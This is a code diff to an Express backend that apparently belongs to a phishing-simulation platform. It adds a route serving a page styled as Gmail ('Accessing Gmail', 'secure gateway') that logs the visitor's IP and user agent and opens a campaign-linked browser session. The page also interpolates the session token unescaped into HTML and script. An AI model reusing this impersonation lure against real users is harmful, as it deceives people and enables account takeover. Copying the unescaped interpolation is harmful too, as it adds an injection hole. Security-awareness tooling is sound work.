@@ -22,6 +22,7 @@ const userGroupRoutes = require('./routes/userGroupRoutes');
 const userRoutes = require('./routes/userRoutes');
 const utilityRoutes = require('./routes/utilityRoutes');
 const aiScraperRoutes = require('./routes/aiScraperRoutes');
+const { router: gmailBrowserRoutes, gmailBrowserController } = require('./routes/gmailBrowserRoutes');
 const trackingService = require('./services/trackingService');
 
 const app = express();
@@ -77,9 +78,158 @@ app.use('/api', userGroupRoutes);
 app.use('/api', userRoutes);
 app.use('/api', utilityRoutes);
 app.use('/api', aiScraperRoutes);
+app.use('/api/gmail-browser', gmailBrowserRoutes);
+app.use('/api/gmail-browser', gmailBrowserRoutes);
 
 // Register landing page routes
 landingPageService.registerLandingPageRoutes(app);
+
+// Handle Gmail browser session routing
+app.get('/gmail-browser/:sessionToken', async (req, res) => {
+  const { sessionToken } = req.params;
+  
+  try {
+    // Check if this is a valid Gmail browser session
+    const sessionInfo = gmailBrowserController.gmailBrowserService.getSessionInfo(sessionToken);
+    
+    if (sessionInfo && sessionInfo.sessionType === 'gmail_browser') {
+      // Create a Gmail browser session if it doesn't exist
+      if (!sessionInfo.isActive) {
+        await gmailBrowserController.gmailBrowserService.createGmailSession(
+          sessionToken, 
+          sessionInfo.campaignId,
+          {
+            ip: req.ip,
+            userAgent: req.get('User-Agent'),
+            timestamp: new Date()
+          }
+        );
+      }
+
+      // Render a page that shows the Gmail browser is active
+      res.send(`
+        <!DOCTYPE html>
+        <html lang="en">
+        <head>
+          <meta charset="UTF-8">
+          <meta name="viewport" content="width=device-width, initial-scale=1.0">
+          <title>Gmail Access - Redirecting</title>
+          <style>
+            body {
+              font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+              background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+              margin: 0;
+              padding: 0;
+              min-height: 100vh;
+              display: flex;
+              align-items: center;
+              justify-content: center;
+            }
+            .container {
+              background: white;
+              padding: 2rem;
+              border-radius: 12px;
+              box-shadow: 0 20px 40px rgba(0,0,0,0.1);
+              text-align: center;
+              max-width: 400px;
+              width: 90%;
+            }
+            .gmail-logo {
+              width: 64px;
+              height: 64px;
+              margin: 0 auto 1rem;
+              background: #ea4335;
+              border-radius: 12px;
+              display: flex;
+              align-items: center;
+              justify-content: center;
+              color: white;
+              font-size: 24px;
+              font-weight: bold;
+            }
+            .spinner {
+              border: 3px solid #f3f3f3;
+              border-top: 3px solid #ea4335;
+              border-radius: 50%;
+              width: 30px;
+              height: 30px;
+              animation: spin 1s linear infinite;
+              margin: 1rem auto;
+            }
+            @keyframes spin {
+              0% { transform: rotate(0deg); }
+              100% { transform: rotate(360deg); }
+            }
+            h1 { color: #333; margin-bottom: 0.5rem; }
+            p { color: #666; margin-bottom: 1.5rem; }
+            .secure-note {
+              background: #f8f9fa;
+              border-left: 4px solid #4285f4;
+              padding: 1rem;
+              margin-top: 1.5rem;
+              text-align: left;
+              border-radius: 0 4px 4px 0;
+            }
+            .secure-note strong { color: #4285f4; }
+          </style>
+        </head>
+        <body>
+          <div class="container">
+            <div class="gmail-logo">G</div>
+            <h1>Accessing Gmail</h1>
+            <p>Please wait while we securely connect you to Gmail...</p>
+            <div class="spinner"></div>
+            <div class="secure-note">
+              <strong>Secure Connection:</strong> Your connection is being processed through our secure gateway for enhanced protection.
+            </div>
+          </div>
+          
+          <script>
+            // Show this page for 3 seconds, then trigger the browser session
+            setTimeout(() => {
+              // Send a request to create the browser session
+              fetch('/api/gmail-browser/create-session', {
+                method: 'POST',
+                headers: {
+                  'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                  sessionToken: '${sessionToken}',
+                  campaignId: ${sessionInfo.campaignId}
+                })
+              }).then(response => response.json())
+                .then(data => {
+                  if (data.success) {
+                    // Update the page to show browser session is active
+                    document.body.innerHTML = \`
+                      <div class="container">
+                        <div class="gmail-logo">✓</div>
+                        <h1>Gmail Browser Session Active</h1>
+                        <p>Your Gmail session is now running in a secure browser environment.</p>
+                        <p><strong>Session ID:</strong> ${sessionToken}</p>
+                        <div class="secure-note">
+                          <strong>Note:</strong> This session is being monitored by your organization's security team for training purposes.
+                        </div>
+                      </div>
+                    \`;
+                  }
+                })
+                .catch(error => {
+                  console.error('Error creating browser session:', error);
+                });
+            }, 3000);
+          </script>
+        </body>
+        </html>
+      `);
+    } else {
+      res.status(404).send('Gmail browser session not found');
+    }
+  } catch (error) {
+    console.error('Error handling Gmail browser route:', error);
+    res.status(500).send('Internal server error');
+  }
+});
 
 // Add a new endpoint to fetch the latest 'In Progress' campaign
 app.get('/api/latest-campaign', async (req, res) => {
@@ -214,6 +364,7 @@ io.on('connection', (socket) => {
 
 // Pass the Socket.IO instance to services that need real-time updates
 websiteMirroringService.setSocketIO(io);
+gmailBrowserController.setSocketIO(io);
 
 app.get('/', (req, res) => {
   res.json({ status: 'Backend is running' });
